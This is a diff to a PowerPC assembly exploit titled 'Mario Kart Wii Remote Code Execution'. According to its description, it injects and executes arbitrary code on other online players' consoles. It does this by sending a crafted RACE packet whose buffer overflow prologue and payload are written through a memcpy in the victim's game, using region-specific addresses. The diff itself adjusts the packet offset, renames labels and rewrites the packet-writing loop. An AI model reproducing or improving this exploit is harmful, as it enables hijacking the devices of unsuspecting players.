@@ -2,9 +2,9 @@
 #            Mario Kart Wii Remote Code Execution            #
 #------------------------------------------------------------#
 # Author  : Star                                             #
-# Date    : Jul 18 2020                                      #
-# File    : remote_code_execution.s                          #
-# Version : 1.1.0.3                                          #
+# Date    : Nov 23 2020                                      #
+# File    : mario_kart_wii_remote_code_execution.s           #
+# Version : 1.1.0.4                                          #
 #------------------------------------------------------------#
 # Description: This code will inject and execute arbitrary   #
 # code on a client.                                          #
@@ -49,7 +49,7 @@
 #============================================================#
 #                           Source                           #
 #------------------------------------------------------------#
-# SendRACEPacket CRC32 Arguments Address:                    #
+# SendRACEPacket Calculate Packet CRC32 Arguments Address:   #
 # RMCE - 0x80653AA8                                          #
 # RMCP - 0x80657F30                                          #
 # RMCJ - 0x8065759C                                          #
@@ -64,7 +64,7 @@ stw       r4, 8(r3)
 lwz       r3, 0(r3)
 
 # Skip over the HEADER magic and CRC32 of the packet
-addi      r5, r3, 8
+addi      r5, r3, 4
 
 #============================================================#
 #                       [PAL 80659B5C]                       #
@@ -91,7 +91,7 @@ addi      r5, r3, 8
 # as their game will not attempt to copy any more data.      #
 #============================================================#
 
-bl        branch_link_record_data
+bl        branch_link_payload_data
 
 # Record sizes
 .byte     HEADER_MAGIC_AND_CRC32_SIZE_BYTE + HEADER_RECORD_SIZES_LENGTH_BYTE + BUFFER_OVERFLOW_PROLOGUE_SIZE_BYTE # HEADER
@@ -119,8 +119,8 @@ bl        branch_link_record_data
 #============================================================#
 #                       [PAL 80659B78]                       #
 #------------------------------------------------------------#
-# This value will be used as the destination to write to     #
-# during the memcpy call.                                    #
+# This value will be used as the destination address to      #
+# write to during the memcpy call.                           #
 #============================================================#
 
 .if       (TARGET_CLIENTS_REGION == 'E') # RMCE
@@ -190,7 +190,7 @@ label_payload_start:
 
 label_payload_end:
 
-branch_link_record_data:
+branch_link_payload_data:
 mflr      r6
 
 li        r7, HEADER_RECORD_SIZES_LENGTH_WORD + BUFFER_OVERFLOW_PROLOGUE_SIZE_WORD + PAYLOAD_INSTRUCTION_SIZE_WORD
@@ -198,9 +198,7 @@ mtctr     r7
 
 branch_write_packet_data_loop:
 lwz       r7, 0(r6)
-stw       r7, 0(r5)
-
-addi      r5, r5, 4
+stwu      r7, 4(r5)
 addi      r6, r6, 4
 
 bdnz+     branch_write_packet_data_loop
